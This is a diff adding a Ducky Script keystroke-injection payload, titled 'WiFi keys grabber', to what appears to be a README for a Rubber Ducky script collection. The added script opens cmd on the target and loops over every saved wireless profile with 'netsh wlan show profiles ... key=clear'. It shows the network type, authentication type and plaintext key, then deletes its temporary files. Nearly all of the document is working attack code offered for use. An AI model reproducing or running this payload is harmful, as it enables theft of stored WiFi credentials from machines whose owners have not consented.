@@ -148,6 +148,44 @@ STRING cls & echo ssid: %a% & echo type: %b% & echo auth: %c% & echo key: %d% & 
 ENTER
 ```
 
+* All SSID's echo version (work in progress);
+```
+REM Title: WiFi keys grabber
+REM Author: SiemH
+REM Version: 1
+REM Description: 
+REM 10 sec payload that shows the Network type, 
+REM Authentication type and network key for all saved networks
+
+REM FASE 1: Preparation
+DELAY 3000
+REM --> Minimize all windows
+WINDOWS d
+DELAY 250
+REM --> Open cmd
+WINDOWS r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 200
+
+REM FASE 2: Information gathering
+REM --> Find all saved networks
+STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:"  %a in ('netsh wlan show profile ^| findstr "Profile"') do echo %a>>a
+ENTER
+REM --> Second for command to fix spaces enfront of SSID's
+STRING for /f "tokens=1 delims= "  %a in (a) do echo %a>>b
+ENTER
+REM --> Get info for each SSID
+REM FIX THIS: Authentication is duplicated
+STRING del a & for /f "tokens=*"  %a in (b) do (netsh wlan show profiles "%a"  key=clear|findstr /c:"Network type"  /c:" Authentication"  /c:"Key Content"|findstr /v "broadcast"| findstr /v "Radio">>%a.x)
+ENTER
+
+REM FASE 3: Show results and cleanup
+STRING del b & cls & type *.x & pause & del *.x & exit
+ENTER
+```
+
 ## Change log;
 1. Original
 2. Bug fixes and narrowed commands
@@ -185,3 +223,5 @@ DELAY 500
 ## To-do;
 * Add empty variable detection which replaces the empty variable with 'variable not obtained'
 * Create array of all saved networks and use 'for each' command to get all the keys
+* Fix duplicated 'Authentication' in 'All SSID's echo' script
+* Improve code
